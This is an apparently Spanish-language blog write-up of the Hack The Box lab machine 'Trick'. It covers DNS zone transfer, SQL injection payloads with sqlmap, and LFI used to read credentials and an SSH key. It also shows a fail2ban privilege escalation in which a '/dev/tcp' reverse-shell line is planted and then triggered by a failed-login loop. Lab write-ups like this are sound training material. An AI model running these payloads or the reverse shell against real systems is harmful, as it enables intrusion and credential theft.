---
layout: single
title: Trick - Hack The Box 
excerpt: "Trick es una máquina Easy Linux que cuenta con un servidor DNS y múltiples vHosts que requieren varios pasos para afianzarse. Requiere conocimientos básicos de DNS para obtener un nombre de dominio y luego subdominio que se puede utilizar para acceder a la primera vHost. En el primer vHost nos encontramos con un sistema de gestión de nóminas que es vulnerable a la inyección SQL. Usando `sqlmap` encontramos que tenemos privilegios de archivo y podemos leer los archivos del sistema. La lectura de un archivo de configuración Nginx revela otro vHost. Este vHost contiene una vulnerabilidad de Inclusión Local de Ficheros (LFI) que puede ser explotada. Enviar un correo a uno de los usuarios con código PHP incrustado y luego incluir ese correo con la LFI permite la Ejecución Remota de Código (RCE). Tras el punto de apoyo inicial encontramos un comando Sudo que puede ser ejecutado sin contraseña. El comando reinicia el servicio `fail2ban`. El directorio de configuración de fail2ban contiene un directorio que es propiedad de un grupo al que pertenece el usuario actual. El usuario tiene acceso de escritura al directorio y puede renombrar un archivo de configuración y reemplazarlo con el suyo propio, lo que lleva a la Ejecución Remota de Código como root una vez que se activa un ban."
date: 2021-05-22
classes: wide
header:
  teaser: /assets/images/htb-writeup-trick/trick_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - web
  - vulnerability assesment
tags:
  - injection
  - custom applications
  - protocols
  - local file inclusion
  - file system configuration
---

![](/assets/images/htb-writeup-trick/trick_logo.png)

Trick es una máquina Easy Linux que cuenta con un servidor DNS y múltiples vHosts que requieren varios pasos para afianzarse. Requiere conocimientos básicos de DNS para obtener un nombre de dominio y luego subdominio que se puede utilizar para acceder a la primera vHost. En el primer vHost nos encontramos con un sistema de gestión de nóminas que es vulnerable a la inyección SQL. Usando `sqlmap` encontramos que tenemos privilegios de archivo y podemos leer los archivos del sistema. La lectura de un archivo de configuración Nginx revela otro vHost. Este vHost contiene una vulnerabilidad de Inclusión Local de Ficheros (LFI) que puede ser explotada. Enviar un correo a uno de los usuarios con código PHP incrustado y luego incluir ese correo con la LFI permite la Ejecución Remota de Código (RCE). Tras el punto de apoyo inicial encontramos un comando Sudo que puede ser ejecutado sin contraseña. El comando reinicia el servicio `fail2ban`. El directorio de configuración de fail2ban contiene un directorio que es propiedad de un grupo al que pertenece el usuario actual. El usuario tiene acceso de escritura al directorio y puede renombrar un archivo de configuración y reemplazarlo con el suyo propio, lo que lleva a la Ejecución Remota de Código como root una vez que se activa un ban.

## Portscan

```
┌─[ot3ro@parrot]─[~/Trick/Nmap]
└──╼ $sudo nmap -sT 10.10.11.166 -p- --open --disable-arp-ping -n -vv --reason -oN nmap-sT-Trick


Nmap scan report for 10.10.11.166
Host is up, received echo-reply ttl 63 (0.16s latency).
Scanned at 2023-08-18 21:03:54 BST for 183s
Not shown: 56584 closed tcp ports (conn-refused), 8947 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
25/tcp open  smtp    syn-ack
53/tcp open  domain  syn-ack
80/tcp open  http    syn-ack

```
## Service Version Detection

```
┌─[ot3ro@parrot]─[~/Trick/Nmap]
└──╼ $sudo nmap -sV 10.10.11.166 -p22,25,53,80 -n --disable-arp-ping


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp open  smtp    Postfix smtpd
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
80/tcp open  http    nginx 1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
El servidor está ejecutando una distribución de Linux basada en Debian.

## Website

El sitio web es bastante sencillo ,parece aún no estar en servicio, tiene una entrada para e-mail de usuario con el propósito de recibir actualizaciones y notificaciones.

![](/assets/images/htb-writeup-trick/screenshot_webpage.png)

vamos a usar la  herramienta whatweb para la enumeración del servidor web.
```
┌─[ot3ro@parrot]─[~/Trick]
└──╼ $whatweb http://10.10.11.166 -v



Status    : 200 OK
Title     : Coming Soon - Start Bootstrap Theme
IP        : 10.10.11.166
Country   : RESERVED, ZZ

Summary   : Bootstrap, HTML5, HTTPServer[nginx/1.14.2], nginx[1.14.2], Script

HTTP Headers:
	HTTP/1.1 200 OK
	Server: nginx/1.14.2
	Date: Fri, 18 Aug 2023 20:39:41 GMT
	Content-Type: text/html
	Last-Modified: Wed, 23 Mar 2022 16:34:04 GMT
	Transfer-Encoding: chunked
	Connection: close
	ETag: W/"623b4bfc-1568"
	Content-Encoding: gzip

```

## enumeración DNS

vemos que hay un servidor DNS local al cual le hacemos una consulta de resolución inversa para encontrar el registro PTR y obtener el nombre del dominio de la ip 10.10.11.166.


```
┌─[ot3ro@parrot]─[~]
└──╼ $dig -x 10.10.11.166 @10.10.11.166



;; QUESTION SECTION:
;166.11.10.10.in-addr.arpa.	IN	PTR

;; ANSWER SECTION:
166.11.10.10.in-addr.arpa. 604800 IN	PTR	trick.htb.

;; AUTHORITY SECTION:
11.10.10.in-addr.arpa.	604800	IN	NS	trick.htb.

;; ADDITIONAL SECTION:
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
 

```
la salida muestra el dominio "trick.htb", que al parecer está configurado para apuntar a la dirección IP local de loopback, que es 127.0.0.1; procederemos a registrar el dominio en el archivo /etc/hosts

```
10.10.11.166 trick.htb

```
A continuación buscamos una zona de transferencia para recolectar más información que podamos aprovechar del dominio trick.htb


```
┌─[ot3ro@parrot]─[~]
└──╼ $dig axfr trick.htb @10.10.11.166



; <<>> DiG 9.18.16-1~deb12u1~bpo11+1-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800

```
y hemos encontrado un Cannonical Name(alias) "preprod-payroll.trick.htb" que apunta al dominio trick.htb, también procedemos a registrarlo en el archivo /etc/hosts


```
10.10.11.166 trick.htb preprod-payroll.trick.htb
```

### [Admin Panel] 

al introducir el subdominio "preprod-payroll.trick.htb" en el navegador , este nos conduce a una interfaz de administración que tiene por título "Admin | Employee's Payroll Management System" que cuenta con dos campos de entrada Username y Password; 
el sitio  parece indicar que se trata de una aplicación personalizada para administrar la nómina de los empleados. 



![](/assets/images/htb-writeup-trick/screenshot_adminpanel.png)

después de algunos intentos de nombres de usuarios y contraseñas comunes , intentamos hacer una inyección sql 'boolean-based blind' 'OR 1=1-- - en el campo username y nos damos cuenta que la aplicación es vulnerable a 'SQL Injection'

luego de analizar un tiempo el panel , encontramos una posible vulnerabilidad para LFI en la cadena de consulta con el parámetro 'page' que se procesa por el script PHP en index.php

![](/assets/images/htb-writeup-trick/screenshot_cadenadeconsulta.png)

Podemos utilizar una URI de PHP que utiliza el wrapper 'php://filter' para aplicar un filtro 'convert.base64-encode' a un recurso identificado como 'resource' ( "php://filter/convert.base64-encode/resource=").
PHP realizará la codificación en base64 del contenido de 'resource' y luego lo mostrará en la respuesta HTTP que se envía al navegador web, codificado en base64.

![](/assets/images/htb-writeup-trick/screenshot_LFI.png)

decodificamos el hash base64:

```
─[✗]─[ot3ro@parrot]─[~/HTB/Trick]
└──╼ $echo -n PD9waHAgaW5jbHVkZSAnZGJfY29ubmVjdC5waHAnID8+DQo8c3R5bGU+DQogICANCjwvc3R5bGU+DQoNCjxkaXYgY2xhc3M9ImNvbnRhaW5lLWZsdWlkIj4NCg0KCTxkaXYgY2xhc3M9InJvdyI+DQoJCTxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+DQoJCQkNCgkJPC9kaXY+DQoJPC9kaXY+DQoNCgk8ZGl2IGNsYXNzPSJyb3cgbXQtMyBtbC0zIG1yLTMiPg0KCQkJPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyAiV2VsY29tZSBiYWNrICIuICRfU0VTU0lPTlsnbG9naW5fbmFtZSddLiIhIiAgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQoJPC9kaXY+DQoNCjwvZGl2Pg0KPHNjcmlwdD4NCgkNCjwvc2NyaXB0Pg==  | base64 --decode


<?php include 'db_connect.php' ?>
<style>
   
</style>

<div class="containe-fluid">

	<div class="row">
		<div class="col-lg-12">
			
		</div>
	</div>

	<div class="row mt-3 ml-3 mr-3">
			<div class="col-lg-12">
                <div class="card">
                    <div class="card-body">
                    <?php echo "Welcome back ". $_SESSION['login_name']."!"  ?>
                                        
                    </div>
                    
                </div>
            </div>
	</div>

</div>
<script>

```
Vemos que se está importando el contenido del archivo 'db_connect.php' en el script PHP actual. Al parecer es un script de sessión de la base de datos.
Intentamos de nuevo una consulta usando la URI : "php://filter/convert.base64-encode/resource=" pero esta vez pasaremos el valor de 'db_connect' al recurso 'resource'.

![](/assets/images/htb-writeup-trick/screenshot_LFI2.png)

Volvemos a obtener un hash base64 en la respuesta HTTP, y procedemos a decodificar:

```
┌─[ot3ro@parrot]─[~/HTB/Trick]
└──╼ $echo -n PD9waHAgDQoNCiRjb25uPSBuZXcgbXlzcWxpKCdsb2NhbGhvc3QnLCdyZW1vJywnVHJ1bHlJbXBvc3NpYmxlUGFzc3dvcmRMbWFvMTIzJywncGF5cm9sbF9kYicpb3IgZGllKCJDb3VsZCBub3QgY29ubmVjdCB0byBteXNxbCIubXlzcWxpX2Vycm9yKCRjb24pKTsNCg0K | base64 -d

<?php

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));

```
Se puede interpretar que hubo un intento de sessión a la base de datos payroll_db, con credenciales de usuario 'remo' y contraseña 'TrulyImpossiblePasswordLmao123' .
Hay que intentar usar esas credenciales para ver si podemos obtener acceso a la máquina target.

```
┌─[ot3ro@parrot]─[~/HTB/Trick/Documents]
└──╼ $ssh remo@10.10.11.166

The authenticity of host '10.10.11.166 (10.10.11.166)' can't be established.
ECDSA key fingerprint is SHA256:Ykwt23InwG4LZMlFycbBhGHEEzrCPU4K9hzt02/dvvU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.166' (ECDSA) to the list of known hosts.
remo@10.10.11.166's password: 
Permission denied, please try again.
remo@10.10.11.166's password: 
Permission denied, please try again.
remo@10.10.11.166's password: 
remo@10.10.11.166: Permission denied (publickey,password).
```
Y se nos deniega el acceso. Podría ser que el usuario 'remo' no esté registrado en el sistema, o que la contraseña esté mal o que le pertenezca a otro usuario.Tenemos que seguir enumerando la máquina para ver que otra info. podemos obtener.
mientras vamos a guardar las credenciales encontradas y seguiremos enumerando. 

Anteriormente vimos que el Panel era vulnerable e la inyección SQL.
Vamos a interceptar el POST request con Burpsuite de los campos de login con cualquier credenciales , en este caso: username=tester&password=tester :

![](/assets/images/htb-writeup-trick/screenshot_burpsuitecapture.png)

Luego intentaremos hacer inyecciones SQL para enumerar la base de datos de la máquina víctima usando SQLMap; Podemos copiar manualmente la petición HTTP POST desde dentro de Burp y escribirla en un archivo, o podemos hacer clic con el botón derecho en la petición dentro de Burp y elegir "Copy to file".

```
┌─[ot3ro@parrot]─[~/HTB/Trick]
└──╼ $sqlmap -r login.req --batch --banner --current-user --current-db --is-dba


Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 4357 FROM (SELECT(SLEEP(5)))LVzy) AND 'dcOC'='dcOC&password=admin

    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=test' OR NOT 3905=3905-- SGqD&password=test

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=test' OR (SELECT 4985 FROM(SELECT COUNT(*),CONCAT(0x7171717a71,(SELECT (ELT(4985=4985,1))),0x717a767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- moHV&password=test



[14:45:31] [INFO] the back-end DBMS is MySQL
[14:45:31] [INFO] fetching banner
[14:45:32] [INFO] retrieved: '10.3.34-MariaDB-0+deb10u1'
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
banner: '10.3.34-MariaDB-0+deb10u1'
[14:45:32] [INFO] fetching current user
[14:45:32] [INFO] retrieved: 'remo@localhost'
current user: 'remo@localhost'
[14:45:32] [INFO] fetching current database
[14:45:32] [INFO] retrieved: 'payroll_db'
current database: 'payroll_db'
[14:45:32] [INFO] testing if current user is DBA
[14:45:32] [INFO] fetching current user
[14:45:32] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
current user is DBA: False

```
Encontramos otra vez al usuario 'remo' que sí tiene acceso a la base de datos 'payroll_db' , pero no tiene privilegios de administrador, tal como se muestra (current user is DBA: False).
Enumeremos la base de datos payroll_db:

```
┌─[✗]─[ot3ro@parrot]─[~/HTB/Trick]
└──╼ $sqlmap -r login.req --batch --dump -D 'payroll_db' --dbms='mysql'


Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type | address | contact | password              | username   |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+

```
identificamos las credenciales del administrador con username 'Enemigosss' del panel de administración al que accedimos anteriormente. Pero tampoco podemos acceder al sistema con esas credenciales, así que por lo pronto no nos sirve de mucho.
 
continuamos enumerando los privilegios del usuario "remo" que encontramos anteriormente:

```
┌─[ot3ro@parrot]─[~/HTB/Trick]
└──╼ $sqlmap -r login.req --batch --dbms='mysql' --privileges


[15:06:45] [INFO] testing MySQL
[15:06:45] [INFO] confirming MySQL
[15:06:45] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[15:06:45] [INFO] fetching database users privileges
[15:06:45] [INFO] resumed: ''remo'@'localhost''
[15:06:45] [INFO] resumed: 'FILE'
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE

```
El usuario 'remo' cuenta con el privilegio 'FILE' , que nos permite la lectura de archivos; permite al usuario realizar tareas como cargar y descargar archivos desde y hacia el sistema de archivos del servidor, así como ejecutar comandos del sistema operativo que involucran la manipulación de archivos.
Podemos leer archivos del sistema con el comando --file-read de SQLMap.

Sería buena idea ahora enumerar los usuarios existentes en el sistema:

```
┌─[✗]─[ot3ro@parrot]─[~/HTB/Trick]
└──╼ $sqlmap -r login.req --batch --dbms='mysql' --file-read "/etc/passwd"



do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[15:14:12] [INFO] retrieved: '2351'
[15:14:12] [INFO] the local file '/home/ot3ro/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (2351 B)
files saved to [1]:
[*] /home/ot3ro/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)

[15:14:12] [INFO] fetched data logged to text files under '/home/ot3ro/.local/share/sqlmap/output/preprod-payroll.trick.htb'


```
Podemos ver que SQLMap nos guarda el contenido del archivo '/etc/passwd' en el path: '/home/ot3ro/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd'

```
┌─[ot3ro@parrot]─[~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files]
└──╼ $grep sh$ /home/ot3ro/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd


root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash

```
Encontramos un usuario llamado 'michael'. no perdemos nada con intentar usar el password 'TrulyImpossiblePasswordLmao123' que encontramos anteriormente para intentar conectarnos al sistema como el usuario michael:

```
┌─[✗]─[ot3ro@parrot]─[~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files]
└──╼ $ssh michael@10.10.11.166

michael@10.10.11.166's password: 
Permission denied, please try again.
michael@10.10.11.166's password: 
Permission denied, please try again.
michael@10.10.11.166's password: 

```
Pero tampoco tenemos éxito.
Podemos continuar leyendo archivos en el sistema con SQLMap de manera más profunda hasta encontrar algo que nos interese.

Hay que recordar que cuando hicimos el escaneo con Nmap, enumeramos un servidor 'nginx 1.14.2'; generalmente el archivo webroot de nginx se encuentra en el path '/etc/nginx/sites-available/default', dependiendo de la configuración del servidor.
vamos a tratar de dumpear el archivo del webroot del servidor Nginx.
```
┌─[ot3ro@parrot]─[~/HTB/Trick]
└──╼ $sqlmap -r login.req --batch --dbms='mysql' --file-read "/etc/nginx/sites-available/default"


do you want confirmation that the remote file '/etc/nginx/sites-available/default' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[19:30:57] [INFO] retrieved: '1058'
[19:30:57] [INFO] the local file '/home/ot3ro/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default' and the remote file '/etc/nginx/sites-available/default' have the same size (1058 B)
files saved to [1]:
[*] /home/ot3ro/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default (same file)

[19:30:57] [INFO] fetched data logged to text files under '/home/ot3ro/.local/share/sqlmap/output/preprod-payroll.trick.htb'

```

```
┌─[✗]─[ot3ro@parrot]─[~/HTB/Trick]
└──╼ $cat /home/ot3ro/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default
server {
	listen 80 default_server;
	listen [::]:80 default_server;
	server_name trick.htb;
	root /var/www/html;

	index index.html index.htm index.nginx-debian.html;

	server_name _;

	location / {
		try_files $uri $uri/ =404;
	}

	location ~ \.php$ {
		include snippets/fastcgi-php.conf;
		fastcgi_pass unix:/run/php/php7.3-fpm.sock;
	}
}


server {
	listen 80;
	listen [::]:80;

	server_name preprod-marketing.trick.htb;

	root /var/www/market;
	index index.php;

	location / {
		try_files $uri $uri/ =404;
	}

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}

```
Se nos muestran en la salida, los vHosts, ya hemos explorado 'trick.htb' y 'preprod-payroll.trick.htb', pero vemos uno nuevo que es 'preprod-marketing.trick.htb', vamos a registrarlo en el archivo '/etc/hosts', y luego exploramos el sitio:

```
10.10.11.166 trick.htb preprod-payroll.trick.htb preprod-marketing.trick.htb

```
## Sitio Web [Business Oriented CSS Template]

Analizando la barra de direcciones , nos volvemos a encontrar con un parámetro que toma una consulta como valor:

![](/assets/images/htb-writeup-trick/screenshot_cadenadeconsulta2.png)

Intentamos payloads de LFI a ver cómo responde la aplicación web.

![](/assets/images/htb-writeup-trick/screenshot_LFI3.png)

Y en efecto la aplicación web es vulnerable al Local File Inclusion. Ahora es importante tratar de conseguir alguna credencial o algo que nos permite acceder de una buena vez al sistema.
Podemos empezar por buscar archivos de los más conocidos en linux que puedan tener información valiosa que podamos usar para entrar al sistema.

vamos a tratar de extraer el archivo 'id_rsa' de el usuario 'michael' que encontramos anteriormente cuando extrajimos el archivo '/etc/passwd':

![](/assets/images/htb-writeup-trick/screenshot_LFI4.png)

Tenemos la clave ssh privada del usuario 'michael'; guardamos la clave en un archivo y luego la usamos para acceder al sistema como el usuario michael.

Hay que asegurarse de cambiar los permisos del archivo para que no nos falle la conexión y el protocolo ssh nos lo acepte:

```
┌─[ot3ro@parrot]─[~]
└──╼ $chmod 600 michael_id_rsa 
```
Luego intentamos la conexión por medio de ssh como el usuario michael:

```
┌─[ot3ro@parrot]─[~]
└──╼ $ssh -i michael_id_rsa michael@10.10.11.166



Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

```
<p style="font-size: 16px;"> Y hemos logrado conectarnos al sistema. </p>

```
## Post-Exploitation 

michael@trick:~$ id

uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)

```
```
michael@trick:~$ whoami

michael
```
```
michael@trick:~$ ls -al

total 80
drwxr-xr-x 15 michael michael 4096 May 25  2022 .
drwxr-xr-x  3 root    root    4096 May 25  2022 ..
-rw-------  1 michael michael 1256 May 25  2022 .ICEauthority
lrwxrwxrwx  1 root    root       9 Apr 22  2022 .bash_history -> /dev/null
-rw-r--r--  1 michael michael  220 Apr 18  2019 .bash_logout
-rw-r--r--  1 michael michael 3526 Apr 18  2019 .bashrc
drwx------  9 michael michael 4096 May 11  2022 .cache
drwx------ 10 michael michael 4096 May 11  2022 .config
drwx------  3 michael michael 4096 May 11  2022 .gnupg
drwx------  3 michael michael 4096 May 11  2022 .local
-rw-r--r--  1 michael michael  807 Apr 18  2019 .profile
drwx------  2 michael michael 4096 May 24  2022 .ssh
drwxr-xr-x  2 michael michael 4096 May 11  2022 Desktop
drwxr-xr-x  2 michael michael 4096 May 11  2022 Documents
drwxr-xr-x  2 michael michael 4096 May 11  2022 Downloads
drwxr-xr-x  2 michael michael 4096 May 11  2022 Music
drwxr-xr-x  2 michael michael 4096 May 11  2022 Pictures
drwxr-xr-x  2 michael michael 4096 May 11  2022 Public
drwxr-xr-x  2 michael michael 4096 May 11  2022 Templates
drwxr-xr-x  2 michael michael 4096 May 11  2022 Videos
-rw-r-----  1 root    michael   33 Sep  2 22:48 user.txt
```
```
michael@trick:~$ cat user.txt 

dbf2b3efed6cd4dbcb1fd424d105be2d

```

<p style="font-size: 16px;"> Hemos obtenido el contenido de la flag 'user.txt'. Ahora tenemos que ver la manera de escalar privilegios, podemos empezar por listar nuestros permisos, etcétera.</p>


```
michael@trick:~$ sudo -l


User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
    
```

<p style="font-size: 16px;">"(root) NOPASSWD: /etc/init.d/fail2ban restart": Esto especifica el comando que el usuario michael puede ejecutar como el usuario root sin necesidad de proporcionar una contraseña. En este caso, es el comando para reiniciar el servicio Fail2ban.</p>


<p style="font-size: 16px;">Tenemos que hacer una investigación sobre fail2ban , sobre cómo funciona, cuáles son los archivos de configuración, y posibles exploits.</p>


><p style="font-size: 14px;"> Fail2ban es una herramienta de seguridad para sistemas Unix-like, incluyendo Linux, que se utiliza para prevenir ataques de fuerza bruta y otros ataques de intrusión en servidores y servicios. Su objetivo principal es proteger los servicios en línea, como SSH, HTTP, FTP y otros, al monitorear registros de acceso en busca de intentos de inicio de sesión fallidos o patrones de actividad sospechosa y tomar medidas para bloquear a los atacantes.</p>


<p style="font-size: 16px;">Básicamente fail2ban monitorea los registros de autenticación de ciertos protocolos como SSH o servicios web. Detecta intentos de autenticación fallidos realizados por clientes o usuarios. Cuando se detecta un número configurado de intentos fallidos en un período de tiempo, Fail2ban toma medidas para proteger el sistema, Esto se logra bloqueando (Baneando) temporalmente la dirección IP desde la cual provienen los intentos fallidos.</p>

## Preparando el terreno de ataque

<p style="font-size: 16px;">El archivo de configuración -que por ahora nos interesan- como "/etc/fail2ban/jail.conf", "defaults-debian.conf" y "/etc/fail2ban/iptables-multiport.conf" , que determinan cómo Fail2ban se comporta en el sistema, incluyendo qué servicios monitorea, cuántos intentos fallidos de inicio de sesión('maxretry') permite antes de bloquear a un cliente y cuánto tiempo dura el bloqueo (por ejemplo, 5 segundos).</p>

<p style="font-size: 16px;">La idea en mente, para lograr escalar privilegios como root, sería: sustituir el valor de la variable "actionban"(acción de baneo) del archivo "/etc/fail2ban/iptables-multiport.conf" por una 'reverse shell', para luego provocar de manera premeditada, varios intentos de autenticación fallidos por SSH, para así forzar al servicio fail2ban que ejecute nuestra revershell automaticamente en vez de banearnos.</p>

><p style="font-size: 14px;">Hay que tener en cuenta que debemos reiniciar el servicio de fail2ban para que surta efecto el ataque.</p>

```
michael@trick:~$ nano /etc/fail2ban/jail.conf 


[sshd]
#enabled = true


# "bantime" is the number of seconds that a host is banned.
bantime  = 3s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host get banned.
maxretry = 3


port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
port     = ssh
[selinux-ssh]
port     = ssh

```
```
michael@trick:/etc/fail2ban/jail.d$ cat defaults-debian.conf 

[sshd]
enabled = true

```
Ya corroboramos que el servicio fail2ban está habilitado sobre el protocolo ssh, ahora vamos a crear nuestra revershell.

```
michael@trick:/dev/shm$ nano revershell.sh


bash -i >& /dev/tcp/10.0.2.8/9001 0>&1

```
```
michael@trick:/dev/shm$ chmod +x revershell.sh 
```


```
michael@trick:/etc/fail2ban/action.d$ ls -al | grep "iptables-multiport.conf"

-rw-r--r-- 1 root root      1420 Sep  4 03:42 iptables-multiport.conf

```
Vemos que no tenemos permiso de escritura sobre el archivo 'iptables-multiport.conf', tendremos que hacer una pequeña maña aquí para obtener ese permiso creando un backup del archivo y y luego hacer copia del backup a un nuevo archivo 'iptables-multiport.conf' creado por nosotros para ser el propietario del archivo:

```
michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.conf.bak
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf
michael@trick:/etc/fail2ban/action.d$ ls -al | grep iptables-multiport.conf

-rw-r--r-- 1 michael michael   1420 Sep  4 06:09 iptables-multiport.conf
-rw-r--r-- 1 root    root      1420 Sep  4 06:09 iptables-multiport.conf.bak

```
Ahora el usuario michael es el propietario del archivo 'iptables-multiport.conf', y ya tendríamos el permiso de escritura.

```
michael@trick: nano /etc/fail2ban/action.d/iptables-multiport.conf 
```
![](/assets/images/htb-writeup-trick/screenshot_actionban.png)

## Ataque

Agregamos la ruta de nuestra revershell a la variable 'actionban' del archivo 'iptables-multiport.conf':

![](/assets/images/htb-writeup-trick/screenshot_actionban_rever.png)

Nos ponemos en escucha, en mi caso por el puerto 9001:
```
┌─[ot3ro@parrot]─[~]
└──╼ $nc -lnvp 9001
listening on [any] 9001 ...
```
Reiniciamos el servicio de fail2ban:

```
michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

Ahora lo que sigue es hacer intentos *fallidos* de autenticación con SSH, es decir, vamos a proporcionar una contraseña erronea apropósito:

>><p style="font-size: 14px;">NOTA: Yo te recomiendo que hagas todo el procedimiento rápido por que el archivo de configuración "iptables-multiport.conf" se va a seguir reiniciando a su valor predeterminado y no se va a mantener como lo modificamos, así que tienes que ser rápido en el procedimiento,yo te recomiendo crear un script que se autentique con ssh a la máquina víctima.</p>

### script 

```bash

for i in {1..6}; do sshpass -p "1234" ssh -o StrictHostKeyChecking=no michael@10.10.11.166; done
```
```
┌─[ot3ro@parrot]─[/tmp]
└──╼ $./script.sh
 
Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.

```
Hemos logrado acceder al sistema como el usuario root:

```
┌─[ot3ro@parrot]─[~]
└──╼ $nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.166] 55890
bash: cannot set terminal process group (5585): Inappropriate ioctl for device
bash: no job control in this shell

root@trick:/# whoami
whoami
root


root@trick:/# cd root	
cd root

root@trick:/root# ls -al
ls -al

total 56
drwx------  8 root root 4096 Jun  7  2022 .
drwxr-xr-x 19 root root 4096 May 25  2022 ..
lrwxrwxrwx  1 root root    9 Apr 22  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  2 root root 4096 May 25  2022 .cache
drwx------  5 root root 4096 May 25  2022 .config
-rw-r--r--  1 root root  139 Apr 22  2022 f2b.sh
drwxr-xr-x  6 root root 4096 Jun 12  2022 fail2ban
drwx------  3 root root 4096 May 25  2022 .gnupg
drwxr-xr-x  3 root root 4096 May 25  2022 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r-----  1 root root   33 Sep  4 00:04 root.txt
-rw-r--r--  1 root root   66 Jun  7  2022 .selected_editor
-rwxr-xr-x  1 root root 1342 Jun  7  2022 set_dns.sh
drwx------  2 root root 4096 May 25  2022 .ssh

```
```
root@trick:/root# cat root.txt
cat root.txt
49da7677d9fc210d1e9e4265ee43e6cd

```
Logramos conseguir la flag del usuario root.
